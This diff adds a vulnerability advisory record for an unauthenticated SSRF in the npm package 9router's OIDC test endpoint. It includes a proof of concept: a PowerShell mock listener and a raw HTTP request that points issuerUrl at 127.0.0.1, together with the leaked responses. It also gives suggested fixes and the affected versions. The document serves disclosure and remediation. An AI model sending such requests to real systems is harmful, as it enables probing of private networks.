@@ -1,0 +1,319 @@
+advisory_id: GHSA-8g4w-4ffg-8vgx
+datasource_id: github_osv/GHSA-8g4w-4ffg-8vgx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8g4w-4ffg-8vgx/GHSA-8g4w-4ffg-8vgx.json
+aliases:
+  - CVE-2026-56677
+summary: "9Router: Authenticated Server-Side Request Forgery (SSRF) via OIDC Provider Test Endpoint\n\
+  ### Summary\n\nA Server-Side Request Forgery (SSRF) vulnerability exists in the 9Router dashboard\
+  \ via the `/api/auth/oidc/test` endpoint. The application accepts a user-controlled URL string\
+  \ through the `issuerUrl` parameter and performs an outbound HTTP request without validating\
+  \ if the destination IP belongs to a restricted internal network range.\n\nNotably, this endpoint\
+  \ can be accessed without active session authentication (Unauthenticated), allowing any remote\
+  \ actor with network visibility to the dashboard API endpoints to trigger outbound infrastructure\
+  \ connections.\n\nDepending on the state and response of the internal port targeted, this\
+  \ flaw exhibits two distinct behaviors:\n\n1. **Port Scanning / Blind SSRF (Non-OIDC structures):**\
+  \ Probing internal ports that are closed or running non-HTTP/non-OIDC services (e.g., SSH,\
+  \ Databases) forces predictable application behavior changes (e.g., structural timeout or\
+  \ clear JSON parsing error messages like \"Unexpected token...\"), allowing internal network\
+  \ reconnaissance.\n2. **Full Data Feed Manipulation (OIDC matching structures):** If the targeted\
+  \ internal service responds with a valid OpenID configuration document structure, the backend\
+  \ successfully processes, parses, and reflects the internal properties back to the client,\
+  \ confirming partial data control.\n\n---\n\n### Vulnerable Code Details\n\n- **Classification:**\
+  \ VE-Class 4 — OIDC SSRF via issuerUrl (Unauthenticated)\n- **File Path:** `src/app/api/auth/oidc/test/route.js`\n\
+  - **Vulnerable Logic:** The endpoint accepts the parameter directly from the client request\
+  \ and passes it directly into the network client routine without prior sanitization or middleware\
+  \ authentication wrapper checks.\n\n```javascript\n// Vulnerable implementation wrapper inside\
+  \ the route handler\nconst discovery = await fetchOidcDiscovery(issuerUrl);\n// Behind the\
+  \ scenes, this executes a direct dynamic outbound request:\n// -> fetch(`${issuerUrl}/.well-known/openid-configuration`)\n\
+  ```\n\nAn unauthenticated user can point this at any internal URL to probe internal services\
+  \ that respond with JSON. The discovery JSON fields (`token_endpoint`, `jwks_uri`) are then\
+  \ processed by the internal application logic for further operations, enabling a multi-step\
+  \ SSRF chain.\n\n---\n\n### Affected Endpoints\n\n- **Endpoint:** `/api/auth/oidc/test`\n\
+  - **Method:** `POST`\n- **Parameter:** `issuerUrl`\n- **Impacted Feature:** OIDC Authentication\
+  \ Configuration Test\n\n---\n\n### Impact\n\nAn unauthenticated attacker can abuse this behavior\
+  \ to use the 9Router instance as a proxy to:\n\n- Conduct internal network topology discovery\
+  \ and port scanning against the hosting infrastructure (`127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`).\n\
+  - Expose internal application error states or feed malicious configuration structures back\
+  \ into the dashboard component logic without needing prior valid session tokens.\n\n---\n\n\
+  ### Proof of Concept & Reproducing Steps\n\n#### Step 1: Set up the Verification Environment\n\
+  \nUtilize a local mock listener on an internal port (e.g., Port 80).\n\nRun the following\
+  \ PowerShell script with Administrative privileges to launch the mock listener:\n\n```powershell\n\
+  $port = 80\n$listener = New-Object System.Net.HttpListener\n$listener.Prefixes.Add(\"http://127.0.0.1:$port/\"\
+  )\n\ntry {\n    $listener.Start()\n    Write-Host \"=======================================================\"\
+  \ -ForegroundColor Cyan\n    Write-Host \"  MOCK OIDC SERVER RUNNING ON PORT 80\" -ForegroundColor\
+  \ Green\n    Write-Host \"=======================================================\" -ForegroundColor\
+  \ Cyan\n\n    while ($listener.IsListening) {\n        $context = $listener.GetContext()\n\
+  \        $request = $context.Request\n        Write-Host \"[+] SSRF Request received for URL:\
+  \ $($request.Url)\" -ForegroundColor Yellow\n        \n        $jsonPayload = '{\"issuer\"\
+  :\"http://127.0.0.1\",\"authorization_endpoint\":\"http://127.0.0.1/oauth/auth\",\"token_endpoint\"\
+  :\"http://127.0.0.1/oauth/token\",\"userinfo_endpoint\":\"EVIDENCE_SSRF_CONFIRMED_SUCCESSFULLY\"\
+  ,\"jwks_uri\":\"http://127.0.0.1/oauth/keys\"}'\n\n        $response = $context.Response\n\
+  \        $response.StatusCode = 200\n        $response.ContentType = \"application/json\"\n\
+  \        \n        $buffer = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)\n       \
+  \ $response.ContentLength64 = $buffer.Length\n        $response.OutputStream.Write($buffer,\
+  \ 0, $buffer.Length)\n        $response.Close()\n        Write-Host \"[*] JSON payload sent\
+  \ back to 9router\" -ForegroundColor Green\n    }\n} catch {\n    Write-Host \"Error starting\
+  \ server on port 80\" -ForegroundColor Red\n} finally {\n    if ($listener.IsListening) {\
+  \ $listener.Stop() }\n}\n```\n\n#### Step 2: Triggering the Vulnerability via Burp Suite\n\
+  \nSend the following raw HTTP request to the 9Router instance (Notice no Cookie header is\
+  \ required):\n\n```http\nPOST /api/auth/oidc/test HTTP/1.1\nHost: localhost:3000\nContent-Type:\
+  \ application/json\nConnection: keep-alive\nContent-Length: 54\n\n{\n  \"issuerUrl\": \"http://127.0.0.1:80\"\
+  ,\n  \"clientId\": \"probe_only\"\n}\n```\n\n#### Step 3: Objective Analysis of Results\n\n\
+  **Scenario A: Targeting an Unmatched/Plain Text Port** (e.g., Port returning raw strings like\
+  \ `\"check vul\"`)\n\nThe server connects to the port, receives a non-JSON response, and errors\
+  \ out during parsing. The application response explicitly leaks the parsing failure:\n\n```json\n\
+  {\"error\":\"Unexpected token 'c', \\\"check vul\\\" is not valid JSON\"}\n```\n\n> **Analysis:**\
+  \ This confirms the backend successfully completed an outbound TCP handshake and read the\
+  \ payload from the internal resource, verifying an Error-based/Blind SSRF context without\
+  \ any user credentials.\n\n---\n\n**Scenario B: Targeting the Valid Mock Port** (Port 80 with\
+  \ the script active)\n\nThe backend connects to the mock listener, successfully fetches the\
+  \ fake configuration data, maps the internal endpoints, and replies with an HTTP 200 OK:\n\
+  \n```json\n{\n  \"ok\": true,\n  \"discoveryOk\": true,\n  \"issuerUrl\": \"http://127.0.0.1:80\"\
+  ,\n  \"authorizationEndpoint\": \"http://127.0.0.1/oauth/auth\",\n  \"tokenEndpoint\": \"\
+  http://127.0.0.1/oauth/token\",\n  \"jwksUri\": \"http://127.0.0.1/oauth/keys\"\n}\n```\n\
+  <img width=\"1513\" height=\"651\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6621f418-7a0d-4660-b301-ad37468d8d7a\"\
+  \ />\n\n> **Analysis:** This confirms a Full Data Feed SSRF. The internal properties parsed\
+  \ directly from the mock script are completely reflected back in the public client response\
+  \ body.\n\n---\n\n### Root Cause Analysis\n\nThe application logic handles network requests\
+  \ initiated by user input inside `/api/auth/oidc/test` without validating the host destination.\
+  \ Additionally, the route handler lacks proper authentication middleware checks to safeguard\
+  \ the functionality, allowing anonymous requests to safely reach internal server loops or\
+  \ private IP subnets.\n\n---\n\n### Suggested Fix\n\n1. **Implement Access Control:** Protect\
+  \ the `/api/auth/oidc/test` handler with authentication middleware to enforce valid user sessions.\n\
+  \n2. **Enforce Protocol Controls:** Validate that `issuerUrl` strictly uses the `https://`\
+  \ protocol scheme before performing the fetch operation.\n\n3. **Implement Network Blocklists:**\
+  \ Resolve the hostname within `issuerUrl` on the server-side before initiating the connection.\
+  \ Validate the resolved IP address and explicitly drop requests pointing to loopback addresses\
+  \ (`127.0.0.0/8`, `::1`) or internal private addresses (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)."
+impacted_packages:
+  - purl: pkg:npm/9router
+    affected_versions: vers:npm/<=0.5.4
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/9router@0.2.13
+      - pkg:npm/9router@0.2.14
+      - pkg:npm/9router@0.2.15
+      - pkg:npm/9router@0.2.16
+      - pkg:npm/9router@0.2.17
+      - pkg:npm/9router@0.2.18
+      - pkg:npm/9router@0.2.19
+      - pkg:npm/9router@0.2.20
+      - pkg:npm/9router@0.2.21
+      - pkg:npm/9router@0.2.22
+      - pkg:npm/9router@0.2.23
+      - pkg:npm/9router@0.2.24
+      - pkg:npm/9router@0.2.25
+      - pkg:npm/9router@0.2.26
+      - pkg:npm/9router@0.2.27
+      - pkg:npm/9router@0.2.29
+      - pkg:npm/9router@0.2.30
+      - pkg:npm/9router@0.2.31
+      - pkg:npm/9router@0.2.32
+      - pkg:npm/9router@0.2.33
+      - pkg:npm/9router@0.2.34
+      - pkg:npm/9router@0.2.36
+      - pkg:npm/9router@0.2.37
+      - pkg:npm/9router@0.2.38
+      - pkg:npm/9router@0.2.39
+      - pkg:npm/9router@0.2.40
+      - pkg:npm/9router@0.2.41
+      - pkg:npm/9router@0.2.42
+      - pkg:npm/9router@0.2.43
+      - pkg:npm/9router@0.2.44
+      - pkg:npm/9router@0.2.45
+      - pkg:npm/9router@0.2.46
+      - pkg:npm/9router@0.2.47
+      - pkg:npm/9router@0.2.48
+      - pkg:npm/9router@0.2.49
+      - pkg:npm/9router@0.2.50
+      - pkg:npm/9router@0.2.51
+      - pkg:npm/9router@0.2.52
+      - pkg:npm/9router@0.2.53
+      - pkg:npm/9router@0.2.54
+      - pkg:npm/9router@0.2.56
+      - pkg:npm/9router@0.2.57
+      - pkg:npm/9router@0.2.58
+      - pkg:npm/9router@0.2.59
+      - pkg:npm/9router@0.2.60
+      - pkg:npm/9router@0.2.61
+      - pkg:npm/9router@0.2.62
+      - pkg:npm/9router@0.2.63
+      - pkg:npm/9router@0.2.64
+      - pkg:npm/9router@0.2.65
+      - pkg:npm/9router@0.2.66
+      - pkg:npm/9router@0.2.67
+      - pkg:npm/9router@0.2.68
+      - pkg:npm/9router@0.2.70
+      - pkg:npm/9router@0.2.71
+      - pkg:npm/9router@0.2.72
+      - pkg:npm/9router@0.2.73
+      - pkg:npm/9router@0.2.74
+      - pkg:npm/9router@0.2.75
+      - pkg:npm/9router@0.2.76
+      - pkg:npm/9router@0.2.77
+      - pkg:npm/9router@0.2.78
+      - pkg:npm/9router@0.2.79
+      - pkg:npm/9router@0.2.80
+      - pkg:npm/9router@0.2.81
+      - pkg:npm/9router@0.2.83
+      - pkg:npm/9router@0.2.84
+      - pkg:npm/9router@0.2.87
+      - pkg:npm/9router@0.2.88
+      - pkg:npm/9router@0.2.89
+      - pkg:npm/9router@0.2.90
+      - pkg:npm/9router@0.2.91
+      - pkg:npm/9router@0.2.92
+      - pkg:npm/9router@0.2.93
+      - pkg:npm/9router@0.2.94
+      - pkg:npm/9router@0.2.95
+      - pkg:npm/9router@0.2.96
+      - pkg:npm/9router@0.2.97
+      - pkg:npm/9router@0.2.98
+      - pkg:npm/9router@0.3.3
+      - pkg:npm/9router@0.3.5
+      - pkg:npm/9router@0.3.6
+      - pkg:npm/9router@0.3.7
+      - pkg:npm/9router@0.3.8
+      - pkg:npm/9router@0.3.9
+      - pkg:npm/9router@0.3.10
+      - pkg:npm/9router@0.3.11
+      - pkg:npm/9router@0.3.12
+      - pkg:npm/9router@0.3.13
+      - pkg:npm/9router@0.3.14
+      - pkg:npm/9router@0.3.15
+      - pkg:npm/9router@0.3.16
+      - pkg:npm/9router@0.3.17
+      - pkg:npm/9router@0.3.19
+      - pkg:npm/9router@0.3.20
+      - pkg:npm/9router@0.3.21
+      - pkg:npm/9router@0.3.22
+      - pkg:npm/9router@0.3.23
+      - pkg:npm/9router@0.3.24
+      - pkg:npm/9router@0.3.27
+      - pkg:npm/9router@0.3.28
+      - pkg:npm/9router@0.3.29
+      - pkg:npm/9router@0.3.30
+      - pkg:npm/9router@0.3.31
+      - pkg:npm/9router@0.3.32
+      - pkg:npm/9router@0.3.33
+      - pkg:npm/9router@0.3.34
+      - pkg:npm/9router@0.3.35
+      - pkg:npm/9router@0.3.36
+      - pkg:npm/9router@0.3.40
+      - pkg:npm/9router@0.3.41
+      - pkg:npm/9router@0.3.42
+      - pkg:npm/9router@0.3.44
+      - pkg:npm/9router@0.3.46
+      - pkg:npm/9router@0.3.47
+      - pkg:npm/9router@0.3.48
+      - pkg:npm/9router@0.3.49
+      - pkg:npm/9router@0.3.50
+      - pkg:npm/9router@0.3.51
+      - pkg:npm/9router@0.3.52
+      - pkg:npm/9router@0.3.53
+      - pkg:npm/9router@0.3.54
+      - pkg:npm/9router@0.3.55
+      - pkg:npm/9router@0.3.56
+      - pkg:npm/9router@0.3.57
+      - pkg:npm/9router@0.3.58
+      - pkg:npm/9router@0.3.60
+      - pkg:npm/9router@0.3.61
+      - pkg:npm/9router@0.3.62
+      - pkg:npm/9router@0.3.63
+      - pkg:npm/9router@0.3.64
+      - pkg:npm/9router@0.3.65
+      - pkg:npm/9router@0.3.66
+      - pkg:npm/9router@0.3.68
+      - pkg:npm/9router@0.3.69
+      - pkg:npm/9router@0.3.70
+      - pkg:npm/9router@0.3.71
+      - pkg:npm/9router@0.3.72
+      - pkg:npm/9router@0.3.74
+      - pkg:npm/9router@0.3.75
+      - pkg:npm/9router@0.3.76
+      - pkg:npm/9router@0.3.78
+      - pkg:npm/9router@0.3.79
+      - pkg:npm/9router@0.3.80
+      - pkg:npm/9router@0.3.81
+      - pkg:npm/9router@0.3.82
+      - pkg:npm/9router@0.3.83
+      - pkg:npm/9router@0.3.84
+      - pkg:npm/9router@0.3.85
+      - pkg:npm/9router@0.3.87
+      - pkg:npm/9router@0.3.89
+      - pkg:npm/9router@0.3.90
+      - pkg:npm/9router@0.3.91
+      - pkg:npm/9router@0.3.96
+      - pkg:npm/9router@0.3.97
+      - pkg:npm/9router@0.3.98
+      - pkg:npm/9router@0.3.99
+      - pkg:npm/9router@0.4.1
+      - pkg:npm/9router@0.4.2
+      - pkg:npm/9router@0.4.3
+      - pkg:npm/9router@0.4.5
+      - pkg:npm/9router@0.4.6
+      - pkg:npm/9router@0.4.8
+      - pkg:npm/9router@0.4.9
+      - pkg:npm/9router@0.4.10
+      - pkg:npm/9router@0.4.11
+      - pkg:npm/9router@0.4.12
+      - pkg:npm/9router@0.4.13
+      - pkg:npm/9router@0.4.14
+      - pkg:npm/9router@0.4.15
+      - pkg:npm/9router@0.4.16
+      - pkg:npm/9router@0.4.17
+      - pkg:npm/9router@0.4.18
+      - pkg:npm/9router@0.4.19
+      - pkg:npm/9router@0.4.20
+      - pkg:npm/9router@0.4.25
+      - pkg:npm/9router@0.4.26
+      - pkg:npm/9router@0.4.27
+      - pkg:npm/9router@0.4.28
+      - pkg:npm/9router@0.4.29
+      - pkg:npm/9router@0.4.31
+      - pkg:npm/9router@0.4.33
+      - pkg:npm/9router@0.4.36
+      - pkg:npm/9router@0.4.37
+      - pkg:npm/9router@0.4.39
+      - pkg:npm/9router@0.4.41
+      - pkg:npm/9router@0.4.45
+      - pkg:npm/9router@0.4.46
+      - pkg:npm/9router@0.4.49
+      - pkg:npm/9router@0.4.50
+      - pkg:npm/9router@0.4.52
+      - pkg:npm/9router@0.4.55
+      - pkg:npm/9router@0.4.58
+      - pkg:npm/9router@0.4.59
+      - pkg:npm/9router@0.4.62
+      - pkg:npm/9router@0.4.63
+      - pkg:npm/9router@0.4.66
+      - pkg:npm/9router@0.4.71
+      - pkg:npm/9router@0.4.80
+      - pkg:npm/9router@0.5.2
+      - pkg:npm/9router@0.5.3
+      - pkg:npm/9router@0.5.4
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8g4w-4ffg-8vgx/GHSA-8g4w-4ffg-8vgx.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+  - CWE-306
+references:
+  - url: https://github.com/decolua/9router
+    reference_type:
+    reference_id:
+  - url: https://github.com/decolua/9router/security/advisories/GHSA-8g4w-4ffg-8vgx
+    reference_type:
+    reference_id:
+exploits: []
